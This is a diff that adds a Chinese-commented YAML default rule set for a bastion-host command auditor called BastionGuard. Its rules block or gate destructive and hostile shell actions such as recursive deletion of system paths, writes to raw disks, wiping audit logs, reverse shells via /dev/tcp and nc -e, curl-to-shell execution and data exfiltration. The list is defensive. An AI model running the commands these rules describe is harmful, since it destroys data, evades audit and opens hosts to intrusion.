@@ -1,0 +1,552 @@
+# BastionGuard 默认高危操作清单
+#
+# 匹配对象全部是引擎归约后的语义 Effect，不是命令字符串：
+#   any_of            匹配解析后的程序 basename（别名/函数/PATH 已归约）
+#   has_flags         匹配规范化后的开关（-rf 会拆成 -r -f）
+#   path_*            匹配解析后的绝对路径目标（变量/glob 无法解析时按动态 fail-closed）
+#   payload_*         匹配 -c / heredoc / 管道 / 解码得到的载荷
+#   inner_rule_ids    递归载荷内部命中的规则 id（解码、ssh 跳转、sudo 包裹都走这里）
+#   dynamic_only      仅当参数是动态拼接时才命中（专门防混淆）
+#
+# action: deny（直接拦截） | approve（break-glass 审批后放行，全程审计） | warn（放行但高亮审计）
+
+break_glass_token: "!break-glass"
+
+rules:
+  # ============ 一、数据销毁（删库/删数据）============================
+  - id: DG-1001
+    title: 递归强制删除根目录或系统目录
+    description: rm -rf 指向 /、/etc、/var、/usr、/home 等系统或数据根路径，等价于销毁主机
+    category: data-destruction
+    action: deny
+    enabled: true
+    match:
+      any_of: ["rm"]
+      has_flags: ["-r", "-f"]
+      recursive: true
+      path_prefix: ["/"]
+
+  - id: DG-1002
+    title: 强制删除数据库数据目录
+    description: 删除 MySQL/PostgreSQL/Redis/MongoDB/ES 的数据目录会直接损毁数据库
+    category: data-destruction
+    action: deny
+    enabled: true
+    match:
+      any_of: ["rm", "rmdir"]
+      path_any:
+        - "/var/lib/mysql"
+        - "/var/lib/postgresql"
+        - "/var/lib/redis"
+        - "/var/lib/mongodb"
+        - "/var/lib/pgsql"
+        - "/data/mysql"
+        - "/data/pg"
+        - "/data/redis"
+
+  - id: DG-1003
+    title: SQL 破坏性语句（DROP/TRUNCATE/无 WHERE 的 DELETE）
+    description: 通过 mysql/psql/sqlite3/redis-cli 执行删库、清表、FLUSHALL 等不可逆语句；普通 SELECT 不命中
+    category: data-destruction
+    action: approve
+    enabled: true
+    match:
+      any_of: ["<sql-destructive>"]
+
+  - id: DG-1004
+    title: find 批量删除（-delete / -exec rm）
+    description: find 遍历后批量删除，常用来绕过对 rm 的字符串过滤；内层删除即使目标动态也拦截
+    category: data-destruction
+    action: deny
+    enabled: true
+    match:
+      any_of: ["find", "xargs"]
+      inner_rule_ids: ["DG-1001", "DG-1002", "DG-1008"]
+
+  - id: DG-1005
+    title: 通配符批量删除关键目录内容
+    description: rm 带 glob 目标且目标落在系统/数据目录，静态不可解析时按动态拦截
+    category: data-destruction
+    action: deny
+    enabled: true
+    match:
+      any_of: ["rm"]
+      has_flags: ["-r"]
+      path_prefix: ["/etc", "/var", "/home", "/data", "/opt", "/usr"]
+
+  - id: DG-1006
+    title: 截断系统或数据库文件
+    description: 通过 > 重定向、truncate 清空 /etc/passwd、数据库表文件等
+    category: data-destruction
+    action: deny
+    enabled: true
+    match:
+      any_of: ["truncate", "<redirect>"]
+      path_prefix: ["/etc", "/var/lib", "/data", "/boot"]
+
+  - id: DG-1007
+    title: shred 不可恢复覆写文件
+    description: shred 对文件做多次覆写，删除后无法取证恢复
+    category: data-destruction
+    action: approve
+    enabled: true
+    match:
+      any_of: ["shred"]
+
+  - id: DG-1008
+    title: 动态参数的强制删除（xargs/find 注入）
+    description: rm 的目标来自管道、占位符 {} 或变量，静态不可还原，无法确认删除范围，按 fail-closed 拦截
+    category: data-destruction
+    action: deny
+    enabled: true
+    match:
+      any_of: ["rm"]
+      has_flags: ["-f"]
+      dynamic_only: true
+
+  # ============ 二、磁盘销毁/占满 =====================================
+  - id: DK-2001
+    title: 直接写块设备（dd of=/dev/sd*）
+    description: dd/重定向直接写裸盘或分区，瞬间摧毁文件系统
+    category: disk-destruction
+    action: deny
+    enabled: true
+    match:
+      any_of: ["dd"]
+      path_glob: ["/dev/sd*", "/dev/nvme*", "/dev/vd*", "/dev/xvd*", "/dev/mapper/*", "/dev/disk/*"]
+
+  - id: DK-2002
+    title: 重定向覆写块设备
+    description: 任意命令通过 > 重定向写 /dev/sd* 等设备节点
+    category: disk-destruction
+    action: deny
+    enabled: true
+    match:
+      path_glob: ["/dev/sd*", "/dev/nvme*", "/dev/vd*", "/dev/xvd*"]
+
+  - id: DK-2003
+    title: 创建文件系统覆盖现有数据
+    description: mkfs/wipefs/blkdiscard 对已用设备重新建文件系统或擦除签名
+    category: disk-destruction
+    action: deny
+    enabled: true
+    match:
+      any_of: ["mkfs", "mke2fs", "mkfs.ext4", "mkfs.xfs", "mkfs.btrfs", "wipefs", "blkdiscard"]
+
+  - id: DK-2004
+    title: 填零/随机数据占满磁盘
+    description: dd 大文件、/dev/zero 落盘等会耗尽磁盘空间导致业务宕机
+    category: disk-destruction
+    action: deny
+    enabled: true
+    match:
+      any_of: ["dd"]
+      arg_contains: ["/dev/zero", "/dev/urandom"]
+
+  - id: DK-2005
+    title: 磁盘分区表操作
+    description: fdisk/parted/gdisk/sfdisk 写分区表，误操作导致整块盘不可用
+    category: disk-destruction
+    action: approve
+    enabled: true
+    match:
+      any_of: ["fdisk", "parted", "gdisk", "sfdisk", "cfdisk"]
+
+  # ============ 三、审计关闭/痕迹清理 ==================================
+  - id: AU-3001
+    title: 停止或禁用审计服务
+    description: 关闭 auditd/rsyslog/syslog-ng 使操作脱离审计
+    category: audit-tampering
+    action: deny
+    enabled: true
+    match:
+      any_of: ["systemctl", "service"]
+      arg_equals_any: ["stop", "disable", "mask"]
+      arg_contains: ["auditd", "rsyslog", "syslog", "syslog-ng"]
+
+  - id: AU-3002
+    title: 清空审计日志与命令历史
+    description: 删除/截断 audit、secure、messages、history 等日志，或 history -c
+    category: audit-tampering
+    action: deny
+    enabled: true
+    match:
+      any_of: ["rm", "truncate", "<redirect>"]
+      path_any:
+        - "/var/log/audit/audit.log"
+        - "/var/log/secure"
+        - "/var/log/auth.log"
+        - "/var/log/messages"
+        - "/var/log/syslog"
+        - "/var/log/wtmp"
+        - "/var/log/btmp"
+        - "/root/.bash_history"
+        - "/home"
+
+  - id: AU-3003
+    title: 清除当前 shell 历史
+    description: history -c / history -w 清空会话命令记录
+    category: audit-tampering
+    action: deny
+    enabled: true
+    match:
+      any_of: ["history"]
+      has_flags: ["--clear-history"]
+
+  - id: AU-3004
+    title: 修改审计规则或日志配置
+    description: auditctl -D 删除规则、修改 audit.rules、调整 rsyslog 配置
+    category: audit-tampering
+    action: deny
+    enabled: true
+    match:
+      any_of: ["auditctl"]
+      arg_equals_any: ["-D", "--delete-logs", "-W"]
+
+  - id: AU-3005
+    title: 删除日志目录或批量清理 /var/log
+    description: 对 /var/log 递归删除/截断，销毁全部主机日志
+    category: audit-tampering
+    action: deny
+    enabled: true
+    match:
+      any_of: ["rm", "rmdir"]
+      path_prefix: ["/var/log"]
+
+  - id: AU-3006
+    title: 卸载/关闭堡垒机自身审计组件
+    description: 停止 bguard-agent、删除审计采集进程，绕过堡垒机管控
+    category: audit-tampering
+    action: deny
+    enabled: true
+    match:
+      any_of: ["systemctl", "service", "pkill", "kill"]
+      arg_contains: ["bguard", "bastion", "audit-agent"]
+
+  # ============ 四、可用性破坏（关机/停服/杀进程）======================
+  - id: AV-4001
+    title: 关机、重启、停机
+    description: shutdown/reboot/poweroff/halt/init 0 直接中断业务
+    category: availability
+    action: approve
+    enabled: true
+    match:
+      any_of: ["shutdown", "reboot", "poweroff", "halt", "init"]
+
+  - id: AV-4002
+    title: 停止关键业务服务
+    description: systemctl stop/disable 数据库、中间件、Web、网络服务
+    category: availability
+    action: approve
+    enabled: true
+    match:
+      any_of: ["systemctl", "service"]
+      arg_equals_any: ["stop", "disable", "mask"]
+      arg_contains:
+        - "mysql"
+        - "mariadb"
+        - "postgresql"
+        - "redis"
+        - "mongodb"
+        - "nginx"
+        - "httpd"
+        - "apache2"
+        - "docker"
+        - "kubelet"
+        - "network"
+        - "sshd"
+
+  - id: AV-4003
+    title: 强杀全部或关键进程
+    description: kill -9 -1、pkill 服务进程名，导致服务批量退出
+    category: availability
+    action: deny
+    enabled: true
+    match:
+      any_of: ["kill", "pkill", "killall"]
+      arg_contains: ["-1", "mysql", "postgres", "redis", "nginx", "docker", "kubelet", "sshd"]
+
+  - id: AV-4004
+    title: 防火墙放行/关闭
+    description: iptables -F、ufw disable、firewalld stop 暴露端口或切断网络
+    category: availability
+    action: approve
+    enabled: true
+    match:
+      any_of: ["iptables", "ip6tables", "nft", "firewall-cmd", "ufw"]
+      arg_equals_any: ["-F", "--flush", "disable", "stop", "IN_POLICY"]
+
+  - id: AV-4005
+    title: 网络服务与网卡操作
+    description: ifdown/ip link set down/nmcli 断开主机网络
+    category: availability
+    action: approve
+    enabled: true
+    match:
+      any_of: ["ifdown", "nmcli", "ip"]
+      arg_contains: ["down", "disconnect", "ifdown"]
+
+  # ============ 五、提权与账号边界 =====================================
+  - id: PR-5001
+    title: 新增特权账号或加 sudo 权限
+    description: useradd/adduser 后加入 root/sudo/wheel 组，或写 sudoers
+    category: privilege
+    action: deny
+    enabled: true
+    match:
+      any_of: ["useradd", "adduser", "usermod", "groupadd", "gpasswd"]
+      arg_contains: ["sudo", "wheel", "root", "-G", "-aG"]
+
+  - id: PR-5002
+    title: 修改 sudoers 或敏感权限位
+    description: 编辑 /etc/sudoers、chmod 4755 提权、chown 系统文件
+    category: privilege
+    action: deny
+    enabled: true
+    match:
+      any_of: ["chmod", "chown", "chgrp", "visudo", "tee"]
+      path_any: ["/etc/sudoers", "/etc/passwd", "/etc/shadow"]
+
+  - id: PR-5003
+    title: 危险 SUID/SGID 提权
+    description: 给 bash/python/find 等加 s 位制造提权后门
+    category: privilege
+    action: deny
+    enabled: true
+    match:
+      any_of: ["chmod"]
+      arg_prefix_any: ["4", "u+s", "g+s"]
+
+  - id: PR-5004
+    title: 重置账号密码
+    description: passwd/chpasswd 修改他人或 root 密码
+    category: privilege
+    action: approve
+    enabled: true
+    match:
+      any_of: ["passwd", "chpasswd"]
+
+  - id: PR-5005
+    title: 切换/退出受限身份
+    description: su 到 root 或其他账号、sudo -i 拿交互式高权 shell
+    category: privilege
+    action: warn
+    enabled: true
+    match:
+      any_of: ["su", "sudo", "doas"]
+      is_interactive: true
+
+  # ============ 六、网络外连（反弹 Shell/隧道/数据外传）===============
+  - id: NE-6001
+    title: 反弹 Shell
+    description: bash -i >& /dev/tcp/HOST/PORT、nc -e、python pty 反弹
+    category: network-egress
+    action: deny
+    enabled: true
+    match:
+      any_of: ["bash", "sh", "nc", "netcat", "ncat", "python", "python3", "perl", "ruby", "<reverse-shell>"]
+      has_flags: ["--reverse-shell"]
+
+  - id: NE-6002
+    title: netcat 监听并执行程序
+    description: nc -l -p PORT -e /bin/bash 建立反向连接入口
+    category: network-egress
+    action: deny
+    enabled: true
+    match:
+      any_of: ["nc", "netcat", "ncat"]
+      has_flags: ["--exec"]
+
+  - id: NE-6003
+    title: SSH 端口转发/代理隧道
+    description: ssh -L/-R/-D 建立隧道绕过网络边界，反向转发默认禁止
+    category: network-egress
+    action: deny
+    enabled: true
+    match:
+      any_of: ["ssh"]
+      has_flags_any: ["-L", "-R", "-D", "-w"]
+
+  - id: NE-6004
+    title: 下载并立即执行（curl|bash 类）
+    description: 从外部地址下载内容直接管道给 shell/解释器执行；要求载荷来源是 curl/wget，避免与本地 base64 解码管道混淆
+    category: network-egress
+    action: deny
+    enabled: true
+    match:
+      any_of: ["sh", "bash", "zsh", "dash", "eval"]
+      has_flags_any: ["--piped-from-curl", "--piped-from-wget"]
+
+  - id: NE-6005
+    title: 外发数据到外部地址
+    description: curl/wget/scp/rsync/nc 将本地文件外传
+    category: network-egress
+    action: warn
+    enabled: true
+    match:
+      any_of: ["curl", "wget", "scp", "sftp", "rsync", "nc", "netcat"]
+      is_remote: true
+
+  - id: NE-6006
+    title: 混淆动态外连/执行（无法静态解析的载荷）
+    description: 变量拼接、命令替换、编码包裹导致载荷无法静态还原，按 fail-closed 拦截
+    category: network-egress
+    action: deny
+    enabled: true
+    match:
+      any_of: ["bash", "sh", "eval", "python", "python3", "perl", "base64", "xxd", "openssl", "nc", "curl", "wget"]
+      payload_dynamic: true
+
+  # ============ 七、软件包生命周期 =====================================
+  - id: PK-7001
+    title: 卸载/清除软件包
+    description: apt/yum/dnf remove/purge 卸载关键包，可能连带删除系统组件
+    category: package-lifecycle
+    action: approve
+    enabled: true
+    match:
+      any_of: ["apt", "apt-get", "yum", "dnf", "rpm", "dpkg"]
+      has_flags: ["--remove"]
+
+  - id: PK-7002
+    title: 自动卸载确认（-y remove 组合）
+    description: 加 -y/--assume-yes 的卸载跳过人工确认，风险更高
+    category: package-lifecycle
+    action: deny
+    enabled: true
+    match:
+      any_of: ["apt", "apt-get", "yum", "dnf"]
+      has_flags: ["--remove"]
+      has_flags_any: ["-y", "--assume-yes", "-q"]
+
+  - id: PK-7003
+    title: pip/npm 全局卸载
+    description: 卸载运行时依赖可能导致服务启动失败
+    category: package-lifecycle
+    action: warn
+    enabled: true
+    match:
+      any_of: ["pip", "pip3"]
+      has_flags: ["--remove"]
+
+  # ============ 八、容器与编排 =========================================
+  - id: CT-8001
+    title: 特权容器/挂载宿主根
+    description: docker run --privileged 或 -v /:/host 可直接控制宿主
+    category: container-runtime
+    action: deny
+    enabled: true
+    match:
+      any_of: ["docker", "podman"]
+      has_flags_any: ["--privileged", "--cap-add=ALL"]
+
+  - id: CT-8002
+    title: 容器内高危执行
+    description: docker exec 进入容器执行删除/关审计等操作，递归套用本规则集
+    category: container-runtime
+    action: deny
+    enabled: true
+    match:
+      any_of: ["docker", "podman", "crictl", "ctr", "kubectl"]
+      inner_rule_ids: ["DG-1001", "AU-3001", "NE-6001", "DK-2001"]
+
+  - id: CT-8003
+    title: 清理容器/卷/镜像
+    description: docker system prune --volumes 删除数据卷，可能销毁容器化数据库
+    category: container-runtime
+    action: approve
+    enabled: true
+    match:
+      any_of: ["docker", "podman"]
+      arg_equals_any: ["prune"]
+      has_flags_any: ["--volumes", "--all", "-a"]
+
+  - id: CT-8004
+    title: 删除 Kubernetes 资源
+    description: kubectl delete ns/pvc/pod 等删除有状态资源
+    category: container-runtime
+    action: approve
+    enabled: true
+    match:
+      any_of: ["kubectl"]
+      arg_equals_any: ["delete"]
+
+  # ============ 九、内核与模块 =========================================
+  - id: KN-9001
+    title: 加载/卸载内核模块
+    description: modprobe/insmod/rmmod 可植入 rootkit 或破坏内核
+    category: kernel
+    action: deny
+    enabled: true
+    match:
+      any_of: ["modprobe", "insmod", "rmmod"]
+
+  - id: KN-9002
+    title: 修改运行时内核参数
+    description: sysctl -w 改内核网络/内存参数，可能关闭安全机制
+    category: kernel
+    action: approve
+    enabled: true
+    match:
+      any_of: ["sysctl"]
+      arg_prefix_any: ["-w"]
+
+  - id: KN-9003
+    title: 操作 /proc /sys 内核接口
+    description: 直接写 /proc/sys、/sys 触发内核级变更
+    category: kernel
+    action: deny
+    enabled: true
+    match:
+      path_prefix: ["/proc/sys", "/sys/kernel"]
+
+  # ============ 十、定时任务持久化 =====================================
+  - id: SC-10001
+    title: 写入/篡改 crontab
+    description: crontab -e、写 /etc/cron.* 植入持久化任务，载荷递归审查
+    category: schedule
+    action: approve
+    enabled: true
+    match:
+      any_of: ["crontab"]
+      is_background: true
+
+  - id: SC-10002
+    title: 删除定时任务
+    description: crontab -r 清空调度，破坏备份/巡检作业
+    category: schedule
+    action: deny
+    enabled: true
+    match:
+      any_of: ["crontab"]
+      has_flags: ["--remove"]
+
+  - id: SC-10003
+    title: at 一次性后台任务
+    description: at 提交延迟执行任务，常被用来绕过前台命令管控
+    category: schedule
+    action: warn
+    enabled: true
+    match:
+      any_of: ["at", "batch"]
+      is_background: true
+
+  # ============ 兜底：无法识别的动态构造 ===============================
+  - id: FB-9001
+    title: 无法静态解析的命令构造（fail-closed 兜底）
+    description: 程序名或关键参数完全由动态拼接/未知编码构成，无法判定真实效果，默认拒绝
+    category: audit-tampering
+    action: deny
+    enabled: true
+    match:
+      any_of: ["<unknown-construct>", "<unparseable-payload>", "<bad-alias>", "<bad-function>"]
+
+  - id: FB-9002
+    title: 动态拼接的程序名（别名/变量混淆兜底）
+    description: 要执行的程序名本身由变量、切片或命令替换拼成（如 $y、${a:3:2}），无法归约到具体二进制，按 fail-closed 拒绝
+    category: audit-tampering
+    action: deny
+    enabled: true
+    match:
+      any_of: ["<dynamic-program>"]
+      dynamic_only: true
